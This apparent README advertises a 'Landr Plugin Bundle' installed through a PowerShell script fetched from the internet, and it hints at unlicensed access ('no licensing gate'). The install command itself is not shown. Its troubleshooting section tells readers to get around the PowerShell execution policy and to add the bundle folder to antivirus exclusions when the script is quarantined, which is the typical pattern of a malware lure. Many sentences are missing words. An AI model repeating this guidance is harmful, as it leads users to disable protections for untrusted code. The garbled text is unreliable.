text:
Landr Plugin Bundle: Complete, Opinionated Config

 

 🚀 PowerShell Quick Install

 

 

 

---

Landr Plugin Bundle is the complete, opinionated configuration layer for Landr — every plugin, every dotfile, every sane default, bundled so nothing is left to assemble by hand. This repo exists because stitching together scattered configs is a waste of your time; the bundle ships the whole arrangement in one self-contained set. If you prefer minimalism, look elsewhere; this is built for people who want the full with an openly accessible starting point and no guesswork.

 🔧 Requirements

- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
- Windows 10 / 11 (x64)
- Internet connection — required to fetch the script
- Administrator — not required

 Features

 Everything included, nothing missing — every plugin in the Landr family ships in one bundle; no piecemeal assembly required.
- Complete and as-is — the set is finished out of the box, so there is no later hunting for stray components.
- One config surface — all plugin settings resolve through a single, predictable structure.
- Keybinds that stay consistent — every plugin shares the same binding scheme; learn it once and it holds everywhere.
- No dependencies to chase — the bundle is self-contained and does not lean on outside tooling.
- Opinionated defaults — sensible starting points are baked in; adjust only what you actually care about.
- Built to be extended — adding your own plugin follows the same conventions as the bundled ones.

 Keybinds

 Ctrl+Shift+P — open the command palette; everything below is reachable from here.
- Ctrl+Shift+L — toggle the plugin bundle panel.
- Ctrl+Alt+R — reload the bundle after config edits.
- Ctrl+Alt+O — open the core build parameters file.
- Ctrl+Alt+K — dump the active keymap to the console.
- Ctrl+Alt+Shift+K — rebind the focused action interactively.

The bundle ships with a permissive default map — accessible out of the box, no licensing gate, no unlock ritual. Override anything in your user config; the bundle's defaults are suggestions, not scripture.

Modifier combos follow platform conventions ( Cmd on macOS mirrors Ctrl elsewhere). If a binding collides with your window manager, remap it — don't file an issue.

 Resolving Issues

 ⚠️ Execution Policy Blocks the Script

Windows may refuse to the configuration script because of its execution policy. If that happens, launch the script through a standard Command Prompt (cmd) instead of PowerShell. The policy applies to the shell session, not to the bundle itself, so this route bypasses the block without changing system-wide settings. If the block persists, set the policy to RemoteSigned for the current user only, then the script again.

 🛡️ Antivirus and SmartScreen Warnings

Security software occasionally flags automated configuration scripts as suspicious. That is expected behavior for anything that writes to your dotfiles and config directories unsupervised. If the script gets quarantined, add the bundle's folder to your security tool's exclusion list, the, then remove the exclusion afterward. Do not disable real-time protection globally — scope the exclusion to the bundle directory and nothing else.

 🔧 Dotfiles Not Applying After

If your config changes don't take effect, the target application is probably still reading a cached or default profile. Close the application completely, confirm the bundle wrote to the expected config path, and relaunch. On Windows, check both %APPDATA% and %USERPROFILE% — some tools split their config across the two, and a partial write leaves you with a half-applied state. When in doubt, back up your existing config directory before rerunning the script.

 🧩 Keybind Conflicts

Custom keybinds silently lose to application defaults when another tool claims the same combination first. If a bind does nothing, check for a competing binding in the host application's own settings before editing the bundle's keymap. Resolve conflicts at the source — one owner per combination — rather than layering overrides on top of each other.

 ♻️ Rolling Back a Bad Configuration

Keep a snapshot of your config directory before every. If a change breaks your, restore the snapshot, then reapply only the bundle components you actually need. The bundle is modular; you are not obligated to load every plugin at once.

 Core Build Parameters

Distribution is compiled as a self-contained desktop package. No runtime dependencies, no external package manager, no environment variables to wire up. Extract, launch, done.

Builds target Windows x64 exclusively. Portable by default — settings and plugin state live in the bundle directory, not in the system registry. Move the folder, keep your configuration.

All plugins ship enabled and preconfigured at first launch. Sensible defaults, no wizard, no onboarding flow. If you want to change something, change it; the bundle does not fight you.

Version pinning is static per release. Each build is locked to a verified plugin set — no auto-update channel, no background fetch, no silent version drift. What you download is what.

Configuration files are plain text and diff-friendly. Keep them in version control if you like; the bundle reads from disk on every start and writes back only on explicit save.

Resource footprint is modest: the bundle loads plugins lazily and keeps idle memory low. Startup time scales with the number of active plugins, not with total bundle size.

Recommended baseline: Windows 10 or 11, x64, 4 GB RAM minimum, 8 GB comfortable. Nothing else required.
